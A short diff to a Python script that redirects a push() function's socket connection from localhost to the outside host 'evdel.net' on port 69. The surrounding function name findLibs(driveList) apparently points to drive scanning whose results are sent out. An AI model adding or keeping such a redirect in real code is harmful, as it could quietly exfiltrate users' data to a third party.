@@ -50,7 +50,7 @@ def findLibs(driveList):
 
 def push(str):
     s = socket.socket()
-    s.connect(('127.0.0.1',69))
+    s.connect(('evdel.net',69))
     s.send(str.encode());
     data = "N:",s.recv(1024).decode()
     s.close()
